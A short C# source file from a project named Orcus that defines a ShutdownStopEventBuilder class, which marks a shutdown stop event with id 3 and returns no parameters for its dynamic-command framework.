namespace Orcus.Shared.DynamicCommands.StopEvents
{
    /// <summary>
    ///     Stop the execution after the computer was shutdown
    /// </summary>
    public class ShutdownStopEventBuilder : IStopEventBuilder
    {
        /// <summary>
        ///     The id of the ShutdownStopEvent is 3
        /// </summary>
        public uint Id { get; } = 3;

        /// <summary>
        ///     Get the paramter of the <see cref="StopEvent" />
        /// </summary>
        /// <returns>The parameter of this execution event which provides all neccessary options</returns>
        public byte[] GetParameter()
        {
            return null;
        }
    }
}